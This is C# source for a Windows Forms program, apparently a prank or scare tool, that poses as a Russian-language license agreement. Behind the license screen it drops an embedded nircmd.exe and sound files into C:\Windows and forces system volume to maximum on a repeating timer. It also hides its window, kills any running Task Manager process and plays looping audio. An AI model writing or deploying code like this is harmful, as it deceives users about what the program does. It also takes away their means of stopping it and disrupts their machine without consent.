using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BatonSwitch
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (checkBox1.Checked == false)
            {
                button1.Enabled = false;
            }
            else if (checkBox2.Checked == false)
            {
                button1.Enabled = false;
            }
            else if (checkBox3.Checked == false)
            {
                button1.Enabled = false;
            }
            else
            {
                button1.Enabled = true;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            data.sign = textBox2.Text;
            string sign = data.sign;
            if (textBox2.Text == "")
            {
                MessageBox.Show("Пожалуйста, подпишите соглашение!", "Ошибка лицензии.", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                bool eng = true;
                for (int i = 0; i < sign.Length; i++) 
                {
                    if (!(Char.IsDigit(sign[i]) || sign[i] >= 'a' && sign[i] <= 'z' || sign[i] >= 'A' && sign[i] <= 'Z'))
                    {
                        eng = false;
                        break;
                    }
                }

                if (eng)
                {
                    MessageBox.Show("Недопустимая подпись, используйте свои имя и фамилию!", "Ошибка лицензии.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    //Запуск программы

                    checkBox1.Checked = true;
                    checkBox2.Checked = true;
                    checkBox3.Checked = true;
                    try
                    {
                        File.WriteAllBytes("C:\\Windows\\one.wav", Properties.Resources.one);
                        File.WriteAllBytes("C:\\Windows\\twitch.wav", Properties.Resources.twitch);
                        File.WriteAllBytes("C:\\Windows\\pik.wav", Properties.Resources.pik);
                        Process.Start("nircmd.exe", "mutesysvolume 0");
                        Process.Start("nircmd.exe", "setsysvolume 65535");
                        SoundPlayer s = new SoundPlayer();
                        s.SoundLocation = "C:\\Windows\\one.wav";
                        button1.Text = "Проверка лицензии...";
                        button1.Enabled = false;
                        checkBox1.Enabled = false;
                        checkBox2.Enabled = false;
                        checkBox3.Enabled = false;
                        textBox2.ReadOnly = true;
                        s.PlaySync();
                        this.Hide();
                        s.SoundLocation = "C:\\Windows\\twitch.wav";
                        s.PlayLooping();
                        MessageBox.Show("Лицензия принята, программа будет запущена. Для запуска нажмите \"ОК\".", "Лицензия.", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        Process[] taskmgr = Process.GetProcessesByName("taskmgr");
                        foreach (var pr in taskmgr)
                        {
                            pr.Kill();
                        }
                        s.SoundLocation = "C:\\Windows\\pik.wav";
                        s.PlayLooping();
                        Form2 f = new Form2();
                        f.Show();
                    }
                    catch
                    {
                        MessageBox.Show("Ваша копия программы является нелицензионной, возможно вы стали жертвой мошенников. Запросите у MrL090nUI подлинную версию.", "Ошибка лицензии.", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }

                    //Запуск программы
                }
            }
        }
       
        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                bool run = false;
                string[] whitelistarray = { "Windows 10 Pro", "Windows 10 Home", "Windows 10 Enterprise", "Windows 10 S" };
                string whitelist = "";
                RegistryKey LocalMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
                RegistryKey Product = LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
                string Productname = (string)Product.GetValue("ProductName");
                foreach (var winname in whitelistarray)
                {
                    whitelist += "\r\n" + winname;
                    if (winname == Productname)
                    {
                        run = true;
                    }
                }

                if (run)
                {
                    File.WriteAllBytes("C:\\Windows\\menu.wav", Properties.Resources.menu);
                    SoundPlayer s = new SoundPlayer();
                    s.SoundLocation = "C:\\Windows\\menu.wav";
                    s.PlayLooping();
                    File.WriteAllBytes("C:\\Windows\\nircmd.exe", Properties.Resources.nircmd);
                }
                else
                {
                    MessageBox.Show($"Ваша версия операционной системы ({Productname}) не поддерживает запуск данной программы. Для запуска установите одну из редакций Windows из данного списка: {whitelist}", "Ошибка запуска.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Environment.Exit(0);
                }
            }
            catch 
            {
                MessageBox.Show("Невозможно запустить данную программу на вашем ПК. Обратитесь к MrL090nUI для решения проблемы.", "Ошибка запуска.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                Process.Start("nircmd.exe", "mutesysvolume 0");
                Process.Start("nircmd.exe", "setsysvolume 65535");
            }
            catch { }
        }
    }
}
